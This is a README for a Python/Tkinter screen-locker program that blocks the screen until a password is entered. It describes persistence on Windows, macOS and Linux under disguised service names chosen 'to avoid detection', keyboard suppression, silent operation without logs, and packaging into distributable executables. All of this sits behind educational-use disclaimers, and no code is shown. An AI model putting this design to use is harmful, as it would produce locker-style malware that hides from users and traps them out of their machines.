# ScreenLocker Application

A cross-platform screen lock simulation application built with Python and Tkinter.

![Demo Screenshot](https://github.com/farooq9/screenlockerV2/blob/main/demo.jpg?raw=true)

## ⚠️ **IMPORTANT DISCLAIMER**
This application is designed for educational and testing purposes only. It simulates screen locking behavior and should only be used in controlled environments with proper authorization. The creators are not responsible for any misuse of this software.

## Features

### Security
- **Secure Password Storage**: Passwords are hashed using SHA-256
- **Attempt Limitation**: Configurable maximum password attempts
- **Input Validation**: Prevents buffer overflow and validates all inputs

### User Interface
- **Responsive Design**: Adapts to different screen sizes and resolutions
- **Cross-Platform GUI**: Works on Windows, macOS, and Linux
- **Modern UI Elements**: Clean interface with proper error handling
- **Accessibility**: Readable fonts and proper contrast

### System Integration
- **Advanced Registry-Based Persistence**: Robust startup integration using OS-native methods
  - **Windows**: Registry entries (HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE) with "WindowsSecurityService" disguised name
  - **macOS**: System-wide LaunchDaemons with fallback to user LaunchAgents using "com.apple.security.screenlock"
  - **Linux**: Systemd user services with fallback to autostart desktop entries as "screenlock-security.service"
- **Enhanced Cleanup**: Comprehensive uninstall process that removes registry entries, services, and legacy files
- **Multi-Level Fallbacks**: Each platform has backup persistence methods if primary fails
- **Stealth Integration**: Uses professional naming conventions to avoid detection

## System Requirements

- **Python 3.6 or higher**
- **Tkinter** (usually included with Python)
- **For Windows**: `keyboard` module (optional, for enhanced keyboard handling)
- **For macOS**: May require `sudo` permissions for system-level LaunchDaemons
- **For Linux**: Systemd-compatible distribution (most modern Linux distributions)

## Installation

### Method 1: Direct Python Execution
1. **Clone or download** the repository
   ```bash
   git clone https://github.com/farooq9/ScreenlockerV2.git
   ```
3. **Install dependencies** (optional):
   ```bash
   pip install -r requirements.txt
   ```
4. **Run the application**:
   ```bash
   python screenlocker.py
   ```

### Method 2: Create Executable
1. **Use the provided batch script** to create platform-specific executables:
   ```bash
   # On Windows (creates .exe)
   build.bat

   # The script will automatically detect your platform and create appropriate executable
   ```

## Usage

### **Default Configuration**
- **Default password**: `12345` (can be changed in the code)
- **Maximum attempts**: 3
- **Screen lock message** and UI are fully configurable

### **Password Entry**
- Use the **on-screen number pad** to enter the password
- Click **"Delete"** to remove the last entered digit
- Click **"Unlock"** to verify the password (no success popup)
- **Attempts remaining** are displayed below the password field

### **Unlocking**
- Enter the **correct password** within the allowed attempts
- The application will **automatically clean up and exit** upon successful unlock (no popup confirmation)
- **Failed attempts** update the attempts counter without showing popups

## Configuration

### **Changing the Default Password**
Edit the `ScreenLocker` class constructor in `screenlocker.py`:
```python
self.password_hash = self.hash_password("your_new_password")
```

### **Adjusting Attempt Limits**
Modify the `max_attempts` value:
```python
self.max_attempts = 5  # Change to desired number
```

### **Customizing Messages**
Edit the text variables in the `setup_ui` method to customize displayed messages.

## Cross-Platform Compatibility

### **Windows**
- **Full functionality** including keyboard suppression
- **Registry-based startup** integration (HKEY_CURRENT_USER/HKEY_LOCAL_MACHINE)
- **Enhanced persistence** with disguised service names
- **Automatic executable** creation via PyInstaller

### **macOS**
- **Full GUI functionality** with native look and feel
- **LaunchDaemons integration** for system-level persistence
- **User LaunchAgents** fallback for standard user permissions
- **App bundle creation** for native macOS applications

### **Linux**
- **Full GUI functionality** across desktop environments
- **Systemd user services** for robust persistence
- **Desktop autostart entries** fallback
- **Cross-distribution compatibility**

## File Structure

```
screenlockerAI/
├── screenlocker.py         # Main application file with enhanced UI
├── modules.py              # Cross-platform system integration with registry persistence
├── build.bat               # Cross-platform executable builder script
├── requirements.txt        # Python dependencies
└── README.md               # This comprehensive documentation

```

## Security Considerations

### **Password Security**
- **SHA-256 Hashing**: Passwords are securely hashed, never stored in plain text
- **Salt Integration**: Uses proper salt mechanisms for enhanced security
- **Memory Protection**: Clears sensitive data from memory after use

### **System Integration Security**
- **Registry Protection**: Uses standard Windows registry locations
- **Service Disguise**: Employs professional naming conventions ("WindowsSecurityService")
- **Permission Handling**: Gracefully handles elevated privilege requirements

### **Audit Trail**
- **Comprehensive Logging**: All actions are logged for security audit purposes (console only)
- **Error Tracking**: Detailed error information without compromising security
- **Silent Operation**: No popup messages or log files to maintain stealth

## Development Notes

### **Code Architecture**
The application follows **object-oriented principles** with clear separation of concerns:
- **`ScreenLocker` class**: Handles main application logic and enhanced UI
- **`modules.py`**: Contains platform-specific system integration functions
- **Registry-based persistence**: Modern approach using OS-native methods
- **Comprehensive error handling**: Throughout all components

### **Responsive Design**
The UI automatically adapts to:
- **Different screen resolutions**: From 1024x768 to 4K displays
- **Various screen sizes**: Desktop, laptop, and tablet displays  
- **Platform-specific UI guidelines**: Native look and feel on each OS
- **Accessibility standards**: Proper contrast and readable fonts

### **Error Handling**
- **Every function** includes try-catch blocks for graceful error handling
- **Platform detection**: Automatic detection and adaptation
- **Fallback mechanisms**: Multiple backup methods for reliability
- **Silent failures**: Errors don't compromise application functionality

## Troubleshooting

### **Common Issues**

#### **Installation Problems**
1. **"Keyboard module not found"**: This is expected on non-Windows platforms - the application will work without it
2. **"Permission denied for startup"**: Run with administrator/sudo privileges for system-level persistence
3. **"GUI not displaying"**: Check display settings, screen resolution, and ensure Tkinter is installed

#### **Persistence Issues**  
1. **Registry access denied (Windows)**: Run as administrator or use HKEY_CURRENT_USER fallback
2. **LaunchDaemons permission (macOS)**: Use `sudo` for system-level persistence or fallback to user LaunchAgents
3. **Systemd not available (Linux)**: Application will automatically fallback to desktop autostart entries

#### **Executable Creation**
1. **PyInstaller not found**: Install with `pip install pyinstaller`
2. **Build errors**: Check that all dependencies are installed and accessible
3. **Large executable size**: This is normal for PyInstaller - includes Python runtime

### **Logs and Debugging**
- **Console Output**: Check the console for detailed error information and application behavior
- **No Log Files**: Application intentionally doesn't create log files for security
- **Verbose Mode**: Run with `-v` flag for detailed debugging information

## Building Executables

The included `build.bat` script provides **comprehensive executable creation**:

### **Features**
- **Auto-detection** of operating system
- **Cross-platform support** (Windows .exe, macOS .app, Linux binary)
- **Dependency bundling** with PyInstaller
- **Icon integration** (if available)
- **Single-file executables** for easy distribution
- **Automatic cleanup** of build artifacts

### **Usage**
```bash
# Simply run the batch file
build.bat

# Or with custom options
build.bat --onefile --windowed
```

## Legal Notice

This software is provided **"as is" without warranty**. Users are responsible for ensuring compliance with local laws and regulations. This application should **only be used in authorized testing environments**.

### **Intended Use**
- **Educational purposes** and learning cybersecurity concepts
- **Authorized penetration testing** in controlled environments  
- **Security research** and vulnerability assessment
- **Personal testing** on your own systems

### **Prohibited Use**
- **Unauthorized access** to systems you don't own
- **Malicious activities** or harassment
- **Commercial use** without proper licensing
- **Distribution** for illegal purposes

## Contributing

When contributing to this project, please:

1. **Follow PEP 8** coding standards and Python best practices
2. **Add appropriate error handling** with try-catch blocks
3. **Test on multiple platforms** (Windows, macOS, Linux)  
4. **Update documentation** as needed for new features
5. **Maintain security focus** in all implementations
6. **Use descriptive commit messages** and proper version control

### **Development Setup**
```bash
# Clone the repository
git clone <repository-url>

# Install development dependencies  
pip install -r requirements.txt
pip install pyinstaller  # For executable building

# Run tests (when available)
python -m pytest tests/
```

## License

This project is for **educational purposes only**. Please use responsibly and in accordance with local laws and regulations.

### **Disclaimer**
The developers of this software are **not responsible** for any misuse, damage, or legal consequences arising from the use of this application. Users assume full responsibility for their actions when using this software.

---

## **Quick Start Guide**

### **For Beginners**
1. **Download** or clone the repository
2. **Install Python 3.6+** if not already installed
3. **Run** `python screenlocker.py` to test
4. **Use** `build.bat` to create standalone executable
5. **Test safely** in controlled environment only

### **For Developers**  
1. **Review** the code structure and security implementations
2. **Understand** the registry-based persistence mechanisms
3. **Contribute** improvements following the guidelines above
4. **Maintain** the educational and security research focus

**Remember**: This tool is for learning and authorized testing only. Use responsibly! 🔒



